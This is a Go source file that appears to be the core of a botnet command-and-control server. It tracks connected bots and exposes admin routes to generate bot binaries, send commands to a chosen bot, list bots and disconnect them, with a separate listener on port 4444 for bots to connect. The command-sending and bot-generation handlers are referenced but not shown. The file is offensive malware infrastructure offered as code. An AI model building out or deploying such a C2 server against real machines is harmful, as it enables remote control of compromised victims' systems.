package main

import (
	"log"
	"net/http"
	"sync"
)

type c2 struct {
	mu   sync.RWMutex
	bots map[string]*Bot
}

func Newc2() *c2 {
	return &c2{
		bots: make(map[string]*Bot),
	}
}

func (c *c2) registerBot(id string, b *Bot) {
	c.mu.Lock()
	defer c.mu.Unlock()

	c.bots[id] = b
}

func (c *c2) getBot(id string) *Bot {
	c.mu.RLock()
	defer c.mu.RUnlock()
	return c.bots[id]

}

func main() {
	var wg sync.WaitGroup
	wg.Add(2)
	c2 := Newc2()

	adminMux := http.NewServeMux()
	adminMux.HandleFunc("/", nil)
	adminMux.HandleFunc("/generatebot", GenerateBot)
	adminMux.HandleFunc("/executeCommand/{botid}/", c2.SendCommand)
	adminMux.HandleFunc("/listBots", c2.ListBots)
	adminMux.HandleFunc("/disconnect/{botid}/", func(w http.ResponseWriter, r *http.Request) {
		botID := r.PathValue("botid")

		if exist := c2.DisconnectBot(botID); !exist {
			log.Println("Bot with id : ", botID, " Does not exist.")
			return
		}
	})

	botMux := http.NewServeMux()
	botMux.HandleFunc("/connect", c2.connectBot)

	go func() {
		defer wg.Done()
		if err := http.ListenAndServe("127.0.0.1:9000", adminMux); err != nil {
			log.Println("Admin Server Error : ", err)
		}
	}()

	go func() {
		defer wg.Done()
		if err := http.ListenAndServe("127.0.0.1:4444", botMux); err != nil {
			log.Println("Bot Server Error : ", err)
		}
	}()

	wg.Wait()

}
